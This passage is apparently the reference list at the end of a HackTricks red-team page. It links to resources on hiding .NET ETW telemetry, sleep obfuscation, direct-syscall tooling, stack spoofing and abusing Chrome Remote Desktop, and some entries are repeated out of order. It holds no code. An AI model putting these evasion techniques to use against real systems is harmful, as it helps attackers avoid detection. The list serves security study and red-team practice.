- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)

{{#include ../banners/hacktricks-training.md}}
